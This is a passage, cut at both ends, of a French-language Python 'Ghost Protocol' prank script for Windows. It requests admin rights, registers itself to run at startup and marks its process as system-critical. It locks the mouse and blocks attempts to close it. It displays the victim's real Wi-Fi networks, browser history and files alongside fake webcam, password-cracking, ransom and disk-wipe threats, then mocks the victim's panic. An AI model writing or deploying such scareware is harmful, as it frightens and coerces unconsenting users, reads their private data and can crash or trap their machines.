        if not ctypes.windll.advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None):
            log_debug("AdjustTokenPrivileges failed")
            ctypes.windll.kernel32.CloseHandle(hToken)
            return False
            
        ctypes.windll.kernel32.CloseHandle(hToken)
        
        # 4. Appeler RtlSetProcessIsCritical dans ntdll
        status = ctypes.windll.ntdll.RtlSetProcessIsCritical(bool(critical), None, False)
        log_debug(f"RtlSetProcessIsCritical({critical}) returned status code: {status}")
        return status == 0
    except Exception as e:
        log_debug(f"Error setting process critical state: {e}")
        return False



# ==============================================================================
# 12. SCÉNARIO PRINCIPAL — GHOST PROTOCOL (12 PHASES)
# ==============================================================================

def run_ghost_scenario():
    global mouse_locked, label_status, root, current_allowed_hwnd, cmd_hwnd, notepad_hwnd, tkinter_hwnd
    global mouse_fight_count, alt_tab_attempt_count, notepad_close_count, is_launching
    global escape_attempt_count, alt_f4_attempt_count, cmd_close_count
    global label_header
    global win_key_attempt_count, task_manager_attempt_count, focus_loss_attempt_count
    global stream_authorized
    
    log_debug("run_ghost_scenario thread started")
    time_orig = sys.modules['time']
    class TimeShadow:
        @staticmethod
        def sleep(seconds):
            start_t = time_orig.time()
            while time_orig.time() - start_t < seconds:
                if not protocol_running:
                    raise InterruptedError("Protocol stopped")
                time_orig.sleep(0.05)
        def __getattr__(self, name):
            return getattr(time_orig, name)
    time = TimeShadow()
    
    try:
        log_debug("run_ghost_scenario main block entered")
        # Activer la surveillance du focus et le watchdog dès le début
        mouse_locked = True
        
        # Rétablir la couleur rouge d'origine du header de l'overlay
        if root and label_header:
            root.after(0, lambda: label_header.config(fg="#ff3333"))
            
        # S'assurer que l'overlay est visible et effacé dès le départ
        show_overlay_panel()
        clear_overlay_screen()
        log_debug("overlay panel shown and screen cleared")
        
        sys_info = get_real_system_info()
        log_debug(f"system info retrieved: {sys_info}")
        
        # Initialiser les variables partagées pour éviter les NameError lors d'une reprise
        try:
            real_count = get_real_browser_history_count()
            url_count = real_count if real_count > 0 else random.randint(1500, 4000)
            log_debug(f"browser history count retrieved: {url_count}")
        except Exception as e_hist:
            url_count = random.randint(1500, 4000)
            log_debug(f"failed to retrieve browser history count: {e_hist}")
        real_wifi = []
        
        # Charger l'état s'il existe
        start_phase = 1
        was_interrupted = False
        state = load_state()
        if state:
            start_phase = state.get("phase", 1)
            was_interrupted = True
            log_debug(f"restored state: phase={start_phase}, interrupted=True")

        # S'ajouter au démarrage automatique de session
        add_to_startup()

        # Lancer l'animation de décryptage initiale si ce n'est pas une reprise après interruption
        if not was_interrupted:
            log_debug("launching animate_logo_launch")
            animate_logo_launch()
            log_debug("animate_logo_launch finished")


        # Si le script a été interrompu, afficher un message de moquerie
        if was_interrupted:
            show_overlay_panel()
            root.after(0, lambda: label_status.config(text="[SYS] TENTATIVE D'EVASION LAMENTABLE DETECTEE !", fg="#ff3333"))
            # Révéler le logo après redémarrage
            reveal_logo_sweep()
            time.sleep(0.5)
            
            type_on_screen("=" * 55 + "\n", delay=0.003)
            type_on_screen("  PROTOCOLE GHOST - LE RETOUR DU MAITRE DU SYSTEME\n", delay=0.02)
            type_on_screen("=" * 55 + "\n\n", delay=0.003)
            
            sc = state.get("shutdown_count", 1)
            mock_messages = [
                f"[!] Oh, tu as appuye sur le bouton power ? (Redemarrage force n°{sc}).\n",
                "[!] C'est adorable. Tu as cru que de l'electricite coupee allait arreter mon code ?\n",
                "[!] Je suis solidement ancre dans tes registres de demarrage Windows.\n",
                "[!] Tu es condamne a me regarder finir ma besogne. Reprenons...\n\n"
            ]
            for msg in mock_messages:
                if not mouse_locked: return
                type_on_screen(msg, delay=0.015)
                time.sleep(0.8)
            
            time.sleep(2.0)
            clear_overlay_screen()
            
        # Rétablir l'environnement si on a sauté des phases (recréation de CMD si nécessaire)
        if start_phase in (4, 5):
            is_launching = True
            root.after(0, create_simulated_cmd)
            while not cmd_hwnd:
                if not mouse_locked: return
                time.sleep(0.05)
            current_allowed_hwnd = cmd_hwnd
            is_launching = False
            
            logo_text = (
                "  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗\n"
                " ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝\n"
                " ██║  ███╗███████║██║   ██║███████╗   ██║   \n"
                " ██║   ██║██╔══██║██║   ██║╚════██║   ██║   \n"
                " ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   \n"
                "  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   \n"
            )
            for line in logo_text.splitlines():
                write_to_cmd(line + "\n")
            write_to_cmd("\n[GHOST PROTOCOL v3.7.1 - TERMINAL INTERACTIF RESUME DES OPERATIONS]\n\n")
        
        # ==================================================================
        # PHASE 1 — BOOT SEQUENCE (~35s, overlay + matrix rain)
        # ==================================================================
        if start_phase <= 1:
            save_state(1)
            root.after(0, lambda: label_status.config(text="[SYS] Initialisation de ta perte de controle...", fg="#00ff00"))
            time.sleep(1.5)
            
            type_on_screen("=" * 55 + "\n", delay=0.003)
            type_on_screen("  GHOST PROTOCOL v3.7.1 - HACK DE L'UTILISATEUR STANDARD\n", delay=0.02)
            type_on_screen("=" * 55 + "\n\n", delay=0.003)
            
            boot_steps = [
                ("> Bypass de l'UAC Windows avec tes propres droits...", "[SUCCES]"),
                ("> Chargement des modules de controle neuronal...", "[PRET]"),
                ("> Connexion au serveur de commande via 5 proxies...", "[ACTIVE]"),
                ("> Masquage du processus dans la memoire cache...", "[MASQUE]"),
                ("> Desactivation preventive de tes reflexes clavier...", "[OK]"),
                ("> Scan de ta vulnerabilite psychologique...", "[100%]"),
                ("> Injection du code dans l'espace kernel...", "[INJECTE]"),
                ("> Escalade de privileges vers NT AUTHORITY\\SYSTEM...", "[MAITRE]"),
            ]
            
            for step_text, result in boot_steps:
                if not mouse_locked: return
                type_on_screen(step_text, delay=0.012)
                time.sleep(random.uniform(0.3, 0.7))
                write_to_screen(f" {result}\n")
                beep_short(1200, 40)
                time.sleep(0.15)
            
            time.sleep(0.8)
            type_on_screen("\n> Collecte des donnees de la victime en cours...\n\n", delay=0.02)
            time.sleep(0.5)
            
            # Afficher les vraies infos système
            info_lines = [
                f"  MACHINE    : {sys_info['hostname']}",
                f"  PROPRIO    : {sys_info['username']} (Bientot ex-proprietaire)",
                f"  IP PUBLIQUE: {sys_info['ip']}",
                f"  MAC ADDR   : {sys_info['mac']}",
                f"  OS VULN.   : {sys_info['os']}",
                f"  STATUT     : CONTROLETOTALETIRREVERSIBLE",
            ]
            for line in info_lines:
                if not mouse_locked: return
                type_on_screen(line + "\n", delay=0.015)
                time.sleep(0.25)
            
            time.sleep(1.0)
            beep_short(600, 300)
            type_on_screen("\n> MACHINE INTEGRALEMENT COMPROMISE. ACCES ILLIMITE VALIDE.\n", delay=0.02)
            root.after(0, lambda: label_status.config(text="[SYS] Analyse de ton disque dur...", fg="#ff5555"))
            time.sleep(2.0)
        
        # ==================================================================
        # PHASE 2 — SYSTEM SCAN (~30s, overlay)
        # ==================================================================
        if start_phase <= 2:
            save_state(2)
            clear_overlay_screen()
            time.sleep(0.3)
            
            type_on_screen("=" * 55 + "\n", delay=0.003)
            type_on_screen("  SCAN INTENSIF DU DISQUE DUR ET DE TA VIE PRIVEE\n", delay=0.02)
            type_on_screen("=" * 55 + "\n\n", delay=0.003)
            
            scan_dirs = [
                "C:\\Windows\\System32\\ (Bientot vide)",
                "C:\\Windows\\SysWOW64\\ (Inutile)",
                f"C:\\Users\\{sys_info['username']}\\Documents\\ (Plein de secrets)",
                f"C:\\Users\\{sys_info['username']}\\Desktop\\ (Quel desordre...)",
                f"C:\\Users\\{sys_info['username']}\\AppData\\Local\\",
                f"C:\\Users\\{sys_info['username']}\\AppData\\Roaming\\",
                "C:\\Program Files\\",
                "C:\\ProgramData\\",
            ]
            
            for d in scan_dirs:
                if not mouse_locked: return
                type_on_screen(f"> Inspection: {d}\n", delay=0.008)
                time.sleep(0.2)
            
            time.sleep(0.5)
            
            animate_progress(label_status, "INDEXATION DE TES ARCHIVES", 7.0)
            
            time.sleep(0.5)
            file_count = random.randint(38000, 56000)
            type_on_screen(f"\n> {file_count:,} fichiers reperes et prets a etre aspires.\n", delay=0.02)
            type_on_screen("> FAIBLESSES CRITIQUES : Ton mot de passe est d'un niveau elementaire\n", delay=0.02)
            type_on_screen("> PORTES DERRIERE (BACKDOORS) : Ouvertes a tous les vents\n", delay=0.02)
            type_on_screen("> KEYLOGGER INJECTE : Enregistre chacun de tes clics de panique\n", delay=0.02)
            type_on_screen(f"> DROITS D'ACCES : Super-Administrateur (SYSTEM)\n", delay=0.02)
            time.sleep(0.8)
            type_on_screen("\n> Lancement du terminal d'administration GHOST...\n", delay=0.02)
            beep_short(800, 200)
            time.sleep(1.5)
        
        # ==================================================================
        # PHASE 3 — TERMINAL HACKING PART 1 (~2min, CMD)
        # ==================================================================
        if start_phase <= 3:
            save_state(3)
            hide_overlay_panel()
            time.sleep(0.3)
            
            is_launching = True
            current_allowed_hwnd = None
            
            root.after(0, create_simulated_cmd)
            
            while not cmd_hwnd:
                if not mouse_locked: return
                time.sleep(0.05)
                
            current_allowed_hwnd = cmd_hwnd
            is_launching = False
            
            if root:
                try:
                    root.after(0, lambda: root.attributes("-topmost", False))
                except Exception:
                    pass
            logo_text = (
                "  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗\n"
                " ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝\n"
                " ██║  ███╗███████║██║   ██║███████╗   ██║   \n"
                " ██║   ██║██╔══██║██║   ██║╚════██║   ██║   \n"
                " ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   \n"
                "  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   \n"
            )
            for line in logo_text.splitlines():
                if not mouse_locked: return
                with cmd_typing_lock:
                    write_to_cmd(line + "\n")
                play_typing_sound("x")
                time.sleep(0.04)
            with cmd_typing_lock:
                write_to_cmd("\n")
            
            human_type_cmd("echo [GHOST PROTOCOL v3.7.1 - TERMINAL DE CONTROLE DE TA MACHINE]")
            human_type_cmd("echo [ROOT SYSTEM PRIVILEGES ACTIVE - BON COURAGE POUR ME FERMER]")
            time.sleep(0.3)
            
            human_type_cmd("netstat -an | findstr ESTABLISHED")
            time.sleep(0.4)
            netstat_output = generate_fake_netstat(sys_info['ip'])
            execute_cmd_command(netstat_output, delay_after=0.5)
            time.sleep(1.0)
            
            human_type_cmd("whoami /priv")
            whoami_output = (
                f"\n  PRIVILEGES SUR LA MACHINE CIBLE\n"
                f"  {'─' * 50}\n"
                f"  Machine    : {sys_info['hostname']}\n"
                f"  Utilisateur : {sys_info['username']}\n"
                f"  Statut     : Esclave numerique\n\n"
                f"  PRIVILEGES SYSTEME DE GHOST :\n"
                f"    SeDebugPrivilege               FORCE\n"
                f"    SeTcbPrivilege                 FORCE\n"
                f"    SeBackupPrivilege              FORCE\n"
                f"    SeRestorePrivilege             FORCE\n"
                f"    SeTakeOwnershipPrivilege       FORCE\n"
                f"    SeRemoteShutdownPrivilege      FORCE\n"
            )
            execute_cmd_command(whoami_output, delay_after=0.5)
            time.sleep(0.5)
            
            human_type_cmd("netsh wlan show profiles | ghost_extract --passwords")
            time.sleep(0.5)
            wifi_output = generate_real_wifi_passwords()
            execute_cmd_command(wifi_output, delay_after=0.5)
            time.sleep(1.0)
            
            human_type_cmd("tree C:\\Windows /F")
            simulate_tree_output()
            write_to_cmd("^C\n")
            time.sleep(0.5)
        
        # ==================================================================
        # PHASE 4 — PREMIER DIALOGUE INTERACTIF (STRESS)
        # ==================================================================
        if start_phase <= 4:
            save_state(4)
            reponse1 = show_custom_confirm(
                title="Alerte de securite critique Windows Defender",
                text=(
                    f"[ALERTE] Une intrusion majeure est en cours sur ta machine :\n"
                    f"Origine : 185.43.217.91 (Moscou, Russie)\n"
                    f"Cible   : {sys_info['hostname']}\n\n"
                    f"GHOST tente de modifier tes fichiers. Voulez-vous le bloquer ?"
                ),
                buttons=["Bloquer (Recommande)", "Ne rien faire (Laisser GHOST controler)"]
            )
            
            current_allowed_hwnd = cmd_hwnd
            time.sleep(0.5)
            
            if reponse1 == "Bloquer (Recommande)":
                execute_cmd_command("\n[!] GHOST: Ah, tu as clique sur 'Bloquer' ? Trop mignon.\n[!] Dommage, ton pare-feu a ete desactive il y a 5 minutes. Trop tard.\n")
            else:
                execute_cmd_command("\n[!] GHOST: Tu n'as meme pas essaye de resister. Sage decision.\n[!] Le protocole s'execute avec ta passive benediction.\n")
            
            time.sleep(1.0)
        
        # ==================================================================
        # PHASE 5 — TERMINAL HACKING PART 2 (webcam + browser + password)
        # ==================================================================
        
        if start_phase <= 5:
            save_state(5)
            human_type_cmd("ghost_cam.exe --activate --silent --no-led")
            time.sleep(0.3)
            
            cam_lines = [
                "[*] Scan des peripheriques webcam...",
                "[*] Web-Cam trouvee : Integrated Camera (USB\\VID_04F2)",
                "[*] Desactivation logicielle de la LED temoin... OK",
                "[*] Initialisation de la capture...",
            ]
            for line in cam_lines:
                if not mouse_locked: return
                execute_cmd_command(line, delay_after=random.uniform(0.4, 0.7))
            
            beep_short(600, 200)
            execute_cmd_command(f"[+] CAPTURE EXECUTEE : face_cam_{time.strftime('%Y%m%d_%H%M%S')}.jpg (2.4 MB)", delay_after=0.5)
            execute_cmd_command("[+] Upload furtif de ta photo de panique vers nos serveurs... OK", delay_after=0.4)
            execute_cmd_command(f"[+] Photo classee dans le dossier /victimes/{sys_info['hostname']}/", delay_after=0.3)
            execute_cmd_command("[!] Camera maintenue active. Regarde l'ecran et souris un peu.\n", delay_after=0.5)
            time.sleep(1.0)
            
            reponse2 = show_custom_confirm(
                title="Ghost Protocol - Alerte Confidentialite",
                text=(
                    "Une photo de votre visage vient d'etre prise.\n"
                    "Elle a ete transmise a notre serveur d'archives.\n\n"
                    "Souhaitez-vous payer pour supprimer l'image de nos serveurs ?"
                ),
                buttons=["Payer 100$ pour supprimer", "Laisser en ligne"]
            )
            
            current_allowed_hwnd = cmd_hwnd
            time.sleep(0.5)
            
            if reponse2 == "Payer 100$ pour supprimer":
                execute_cmd_command("\n[!] GHOST: Tu as vraiment sorti ta carte bleue ? Hahaha !\n[!] Je n'ai pas de terminal de paiement, et ta photo est deja sur 3 forums russes.\n")
            else:
                execute_cmd_command("\n[!] GHOST: Tu preferes l'exhiber ? Parfait.\n[!] Elle sera utilisee pour illustrer notre tableau de chasse.\n")
            
            time.sleep(1.0)
            
            human_type_cmd("ghost_browser.exe --scan-all --extract-history")
            time.sleep(0.5)
            
            browser_lines = [
                "[*] Extraction de l'historique de Chrome...",
                "[*] Extraction de l'historique de Firefox...",
                "[*] Extraction de l'historique de Edge...",
            ]
            for line in browser_lines:
                if not mouse_locked: return
                execute_cmd_command(line, delay_after=random.uniform(0.3, 0.5))
            
            real_count = get_real_browser_history_count()
            url_count = real_count if real_count > 0 else random.randint(1500, 4000)
            execute_cmd_command(f"[+] {url_count} adresses web extraites avec succes. Voici un apercu de tes gouts :\n", delay_after=0.3)
            
            browser_history = generate_browser_history_display()
            execute_cmd_command(browser_history, delay_after=0.5)
            execute_cmd_command("[+] Historique complet exporte dans /loot/browser_dump.json\n", delay_after=0.3)
            time.sleep(1.5)
            
            human_type_cmd(f"ghost_crack.exe --sam --target={sys_info['username']}")
            time.sleep(0.5)
            
            execute_cmd_command("[*] Extraction de la base de donnees SAM...", delay_after=0.5)
            execute_cmd_command("[*] Hash NTLM de ta session : 5f4dcc3b5aa765d61d8327deb882cf99", delay_after=0.4)
            execute_cmd_command("[*] Craquage de ton mot de passe par dictionnaire...\n", delay_after=0.3)
            
            simulate_password_crack()
            
            time.sleep(0.5)
            beep_short(600, 300)
            execute_cmd_command(f"\n[!] Identifiants Windows de '{sys_info['username']}' entierement craques.\n", delay_after=0.5)
            time.sleep(1.5)
        
        # ==================================================================
        # PHASE 6 — MESSAGE DU FANTOME (NOTEPAD, ~2min)
        # ==================================================================
        if start_phase <= 6:
            save_state(6)
            is_launching = True
            current_allowed_hwnd = None
            
            root.after(0, create_simulated_notepad)
            
            while not notepad_hwnd:
                if not mouse_locked: return
                time.sleep(0.05)
                
            current_allowed_hwnd = notepad_hwnd
            is_launching = False
            
            logo_text = (
                "\n"
                "  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗\n"
                " ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝\n"
                " ██║  ███╗███████║██║   ██║███████╗   ██║   \n"
                " ██║   ██║██╔══██║██║   ██║╚════██║   ██║   \n"
                " ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   \n"
                "  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   \n"
                "\n"
            )
            for line in logo_text.splitlines():
                if not mouse_locked: return
                with notepad_typing_lock:
                    write_to_notepad(line + "\n")
                play_typing_sound("x")
                time.sleep(0.04)
                
            message_header = (
                "  ================================================================\n"
                "  ||             AVERTISSEMENT SOLENNEL DE GHOST                ||\n"
                "  ================================================================\n"
                "\n"
            )
            human_type_notepad(message_header)
            time.sleep(0.5)
            
            # Collecter les preuves réelles
            real_urls = get_real_browser_history(3)
            history_proof = ""
            if real_urls:
                history_proof = "\n         Preuve (Derniers sites visites par ta curiosite) :\n"
                for _, url, _ in real_urls:
                    short_url = url
                    if len(short_url) > 55:
                        short_url = short_url[:52] + "..."
                    history_proof += f"          - {short_url}\n"
                    
            desktop_files = get_desktop_files(3)
            desktop_proof = ""
            if desktop_files:
                desktop_proof = "\n         Preuve (Fichiers qui trainent sur ton Bureau) :\n"
                for f in desktop_files:
                    desktop_proof += f"          - {f}\n"
    
            # Collecter les SSID de WiFi réels (jusqu'à 3)
            real_wifi = []
            try:
                meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], stderr=subprocess.DEVNULL, shell=True).decode('utf-8', errors='ignore')
                profiles = re.findall(r":\s(.*)", meta_data)
                profiles = [p.strip() for p in profiles if p.strip() and not p.strip().startswith("Tous les profils")]
                # Dédupliquer tout en conservant l'ordre
                seen = set()
                real_wifi = [x for x in profiles if not (x in seen or seen.add(x))][:3]
            except Exception:
                pass
            
            wifi_proof = ""
            if real_wifi:
                wifi_proof = "\n         Preuve (Tes connexions WiFi preferees) :\n"
                for ssid in real_wifi:
                    wifi_proof += f"          - {ssid}\n"
    
            message_body = (
                f"  Salut {sys_info['username']},\n\n"
                f"  Je suis GHOST. Ton ordinateur \"{sys_info['hostname']}\"\n"
                f"  est desormais sous ma tutelle exclusive.\n\n"
                f"  Voici le bilan de ta securite informatique (si on peut appeler ca comme ca) :\n"
                f"    [x] Privilege de controle total SYSTEM obtenu\n"
                f"    [x] Capture webcam effectuee (tu as une mine superbe !)\n"
                f"    [x] {url_count} URLs d'historique web aspirees{history_proof}"
                f"    [x] Mots de passe WiFi devalises{wifi_proof}"
                f"    [x] Ton mot de passe Windows mis a nu{desktop_proof}"
                f"    [x] Enregistreur de touches actif\n\n"
                f"  La cause de ce desastre ? Elle est devant l'ecran : c'est toi.\n"
                f"  Tu as double-clique sur mon script sans te poser de questions.\n"
            )
            human_type_notepad(message_body)
            time.sleep(1.0)
            
            # Analyse du comportement du spectateur
            if mouse_fight_count > 40:
                human_type_notepad(f"\n  [ANALYSE] J'ai compte {mouse_fight_count} secousses de souris desesperees.\n  Tu essaies de lutter. C'est vain mais divertissant.\n")
                time.sleep(0.5)
            
            if escape_attempt_count > 0:
                human_type_notepad(f"\n  [ANALYSE] {escape_attempt_count} tentatives sur la touche Echap.\n  Tu voulais fuir ? C'est mignon.\n")
                time.sleep(0.5)
                
            if alt_f4_attempt_count > 0:
                human_type_notepad(f"\n  [ANALYSE] {alt_f4_attempt_count} tentatives de fermer avec Alt+F4.\n  Un classique de la panique.\n")
                time.sleep(0.5)
            
            if cmd_close_count > 0:
                human_type_notepad(f"\n  [ANALYSE] Tu as clique sur la petite croix du terminal {cmd_close_count} fois.\n  Elle ne fonctionne plus, accepte-le.\n")
                time.sleep(0.5)
            
            message_threat = (
                "\n\n  ================================================================\n"
                "  CE N'EST PAS UN JEU. PASSONS AUX CHOSES SERIEUSES.\n"
                "  ================================================================\n\n"
                "  Toutes les archives de ta vie numerique sont en cours de\n"
                "  chargement. Des que la barre de progression atteint 100%,\n"
                "  la procedure d'effacement complet de ton disque dur\n"
                "  sera initiee.\n\n"
                "  Tu vas avoir une seule et unique chance d'annuler le massacre.\n"
                "  Sois tres attentif a ce qui va suivre.\n"
            )
            human_type_notepad(message_threat)
            time.sleep(2.5)
        
        # ==================================================================
        # PHASE 7 — TRANSFERT DE FICHIERS (~30s, retour overlay)
        # ==================================================================
        if start_phase <= 7:
            save_state(7)
            root.after(0, lambda: destroy_simulated_window("notepad"))
            time.sleep(0.3)
            root.after(0, lambda: destroy_simulated_window("cmd"))
            time.sleep(0.3)
            
            show_overlay_panel()
            clear_overlay_screen()
            current_allowed_hwnd = tkinter_hwnd
            
            # Réactiver topmost
            if root:
                try:
                    root.after(0, lambda: root.attributes("-topmost", True))
                except Exception:
                    pass
            
            time.sleep(0.5)
            root.after(0, lambda: label_header.config(fg="#ff3333"))
            
            simulate_file_transfer(sys_info)
            
            time.sleep(1.5)
        
        # ==================================================================
        # PHASE 8 — COUNTDOWN FINAL (~30s, overlay)
        # ==================================================================
        if start_phase <= 8:
            save_state(8)
            clear_overlay_screen()
            root.after(0, lambda: label_status.config(text="[!] PROCESSUS IRREVERSIBLE EN COURS", fg="#ff0000"))
            time.sleep(0.8)
            
            beep_short(400, 500)
            
            animate_countdown(30)
            
            time.sleep(0.5)
        
        # ==================================================================
        # PHASE 9 — DERNIÈRE CHANCE (code 42, 5 tentatives)
        # ==================================================================
        if start_phase <= 9:
            save_state(9)
            clear_overlay_screen()
            root.after(0, lambda: label_status.config(text="[!] CODE D'ANNULATION REQUIS", fg="#ff5555"))
            
            # Réinitialiser le text widget pour le mode normal
            def _reset_font():
                try:
                    screen_text_widget.tag_configure("default", font=("Consolas", 10), foreground="#00ff00")
                except Exception:
                    pass
            root.after(0, _reset_font)
            time.sleep(0.3)
            
            type_on_screen("=" * 55 + "\n", delay=0.003)
            type_on_screen("  DERNIERE CHANCE - CODE D'ANNULATION D'URGENCE\n", delay=0.02)
            type_on_screen("=" * 55 + "\n\n", delay=0.003)
            type_on_screen("> Le countdown est termine.\n", delay=0.02)
            type_on_screen("> La suppression est imminente.\n\n", delay=0.02)
            type_on_screen("> Pour annuler la procedure de suppression,\n", delay=0.02)
            type_on_screen("> vous devez entrer le CODE SECRET.\n\n", delay=0.02)
            type_on_screen("> Indice : La reponse a la question ultime sur\n", delay=0.02)
            type_on_screen("> la Vie, l'Univers, et le Reste.\n\n", delay=0.02)
            
            time.sleep(1.0)
            
            code_secret = ""
            attempts = 0
            max_attempts = 5
            
            hints = [
                "Indice 1 : Devine. C'est dans H2G2.",
                "Indice 2 : Un nombre entre 41 et 43, gros genie.",
                "Indice 3 : Allez, c'est 6 x 7. Sais-tu faire des multiplications ?",
                "Indice 4 : Deux chiffres. Le premier est 4. Le second est 2.",
                "Indice 5 : BON. T'ES PAS COMPATIBLE AVEC LE CLAVIER ? TAPE 42 ET BOUCLE-LA.",
            ]
            
            while code_secret != "42" and attempts < max_attempts:
                code_secret = show_custom_prompt(
                    title=f"Code de securite ({attempts+1}/{max_attempts})",
                    text=(
                        "[GHOST CORE SYSTEM PROTECTION]\n"
                        "Destruction irreversible en cours.\n"
                        "Tape le code secret avant que ton disque ne devienne un presse-papier :"
                    )
                )
                
                attempts += 1
                current_allowed_hwnd = tkinter_hwnd
                
                if code_secret == "42":
                    beep_short(1500, 100)
                    type_on_screen("\n[+] CODE CORRECT : 42 (Miracle, tu sais lire !)\n", delay=0.02)
                    type_on_screen("[+] Sequence de destruction : ANNULEE (Tu as eu chaud)\n", delay=0.02)
                    type_on_screen("[+] Transfert de tes fichiers : INTERROMPU\n", delay=0.02)
                    type_on_screen("[+] Webcam : DESACTIVEE (Tu peux arreter de stresser)\n", delay=0.02)
                    type_on_screen("[+] Keylogger : SUPPRIME (Pour l'instant...)\n", delay=0.02)
                    type_on_screen("[+] Connexion au serveur : COUPEE\n", delay=0.02)
                    break
                else:
                    beep_short(300, 200)
                    if not code_secret:
                        type_on_screen(f"\n[x] Temps ecoule ou reponse vide... ({attempts}/{max_attempts})\n", delay=0.02)
                    else:
                        type_on_screen(f"\n[x] Code risible : '{code_secret}' ({attempts}/{max_attempts})\n", delay=0.02)
                    
                    if attempts <= len(hints):
                        type_on_screen(f"[?] {hints[attempts-1]}\n", delay=0.02)
                    
                    time.sleep(0.5)
            
            if code_secret != "42":
                type_on_screen("\n[!] Toutes les chances gaspillees. Quel desastre.\n", delay=0.02)
                type_on_screen("[!] Lancement de la destruction finale de ta partition...\n", delay=0.02)
                time.sleep(1.0)
                type_on_screen("[!] Formatage bas niveau du disque C:\\ en cours...\n", delay=0.02)
                time.sleep(1.5)
                type_on_screen("[!] ... Adieu tes photos de vacances ...\n", delay=0.5)
                type_on_screen("[!] ... Adieu ton bureau mal range ...\n", delay=0.5)
                type_on_screen("[!] ......... Nettoyage complet reussi.\n", delay=0.5)
                time.sleep(2.0)
            
            time.sleep(1.5)
        
        # ==================================================================
        # PHASE 10 — LA REVELATION + STATISTIQUES
        # ==================================================================
        clear_overlay_screen()
        
        # Changer les couleurs du panneau pour la révélation
        root.after(0, lambda: label_header.config(fg="#00ff00"))
        root.after(0, lambda: label_status.config(text="", fg="#00ff00"))
        
        time.sleep(1.0)
        
        has_real_history = len(get_real_browser_history(1)) > 0
        history_reveal_line = (
            "    [OK] L'historique de navigation affiche etait REEL\n"
            "         (lu localement sur ton PC, mais JAMAIS transfere, calmes-toi)"
            if has_real_history else
            "    [OK] Aucun historique de navigation n'a ete extrait"
        )
        
        has_real_wifi = len(real_wifi) > 0
        wifi_reveal_line = (
            "    [OK] Les reseaux WiFi affiches etaient les TIENS\n"
            "         (lus localement, mais JAMAIS envoyes a Moscou)"
            if has_real_wifi else
            "    [OK] Aucun profil WiFi n'a ete extrait"
        )
        
        has_real_transfer = len(get_real_files_to_transfer(sys_info['username'], 1)) > 0
        transfer_reveal_line = (
            "    [OK] Les fichiers listes etaient bien tes VRAIS fichiers\n"
            "         (lus sur ton Bureau, mais aucun octet n'a quitte ta machine)"
            if has_real_transfer else
            "    [OK] Aucun fichier reel n'a ete simule pour le transfert"
        )

        reveal_text = (
            "\n\n"
            "  ╔═══════════════════════════════════════════╗\n"
            "  ║                                           ║\n"
            "  ║        J U S T   K I D D I N G   ;)       ║\n"
            "  ║                                           ║\n"
            "  ╚═══════════════════════════════════════════╝\n"
            "\n\n"
            "  Ceci n'etait qu'une SIMULATION de piratage.\n"
            "  Un simple script Python d'automatisation.\n\n"
            "  Voici la verite (pour faire redescendre ton stress) :\n\n"
            "    [OK] Aucun fichier n'a ete supprime ni corrompu\n"
            "    [OK] Ta webcam n'a JAMAIS ete activee (pas de photo prise)\n"
            "    [OK] Aucune donnee n'a ete envoyee sur internet\n"
            "    [OK] Ton mot de passe Windows SAM est reste intouchable\n"
            f"{wifi_reveal_line}\n"
            f"{history_reveal_line}\n"
            f"{transfer_reveal_line}\n"
            "    [OK] Absolument TOUT ce que tu as vu etait de la pure simulation.\n\n"
        )
        type_on_screen(reveal_text, delay=0.012)
        time.sleep(1.0)
        
        # Statistiques du spectateur
        stats_text = (
            "  ═══════════════════════════════════════════\n"
            "  DOSSIER PSYCHOLOGIQUE DE LA VICTIME :\n"
            "  ═══════════════════════════════════════════\n\n"
            f"  Spam compulsif de la touche Echap  : {escape_attempt_count} fois\n"
            f"  Tentatives desesperees de Alt+F4   : {alt_f4_attempt_count} fois\n"
            f"  Essais de fuite avec Alt+Tab       : {alt_tab_attempt_count} fois\n"
            f"  Clicks frenetiques Touche Windows  : {win_key_attempt_count} fois\n"
            f"  Tentatives d'ouvrir le Task Manager: {task_manager_attempt_count} fois\n"
            f"  Pertes de focus (clics de panique) : {focus_loss_attempt_count} fois\n"
            f"  Fermetures du terminal bloquees    : {cmd_close_count} fois\n"
            f"  Fermetures du Notepad bloquees     : {notepad_close_count} fois\n"
            f"  Mouvements de souris paniques      : {mouse_fight_count} fois\n\n"
            "  Merci d'avoir ete un cobaye si facile a destabiliser ! :)\n\n"
            "  Le script va s'autodétruire proprement dans 15 secondes...\n"
        )
        type_on_screen(stats_text, delay=0.008)
        
        # Attendre 15 secondes avant de fermer
        for i in range(15, 0, -1):
            if not mouse_locked: return
            root.after(0, lambda s=i: label_status.config(text=f"Fermeture dans {s} secondes...", fg="#00ff00"))
            time.sleep(1.0)
        
        # Fin propre
        stop_and_clean()
        print("[*] Demonstration interactive terminee avec succes !")
        
    except InterruptedError:
        # Arrêt demandé par l'opérateur (pas une vraie erreur)
        log_debug("run_ghost_scenario interrupted by operator")
        stop_and_clean()
    except Exception as e:
        log_debug(f"run_ghost_scenario critical exception: {e}")
        log_debug(traceback.format_exc())
        stop_and_clean()


if __name__ == "__main__":
    try:
        # Restaurer le dossier de travail actuel pour éviter C:\Windows\System32 après élévation UAC
        try:
            os.chdir(os.path.dirname(os.path.abspath(__file__)))
        except Exception:
            pass
            
        # Demande d'élévation UAC
        elevate_privileges()
        
        # Empêcher plusieurs instances concurrentes de saturer la machine
        check_single_instance()
        
        # Démarrer la surveillance continue des raccourcis d'arrêt d'urgence
        # (Fonctionne 100% du temps en arrière-plan : Ctrl+Shift+Alt+Q, Ctrl+Shift+Alt+Echap, Ctrl+Shift+Alt+F12)
        start_emergency_hotkey_listener()
        
        # Enregistrer l'exécutable pour qu'il se lance toujours au démarrage
        add_to_startup()
        
        # Demander l'autorisation de streaming
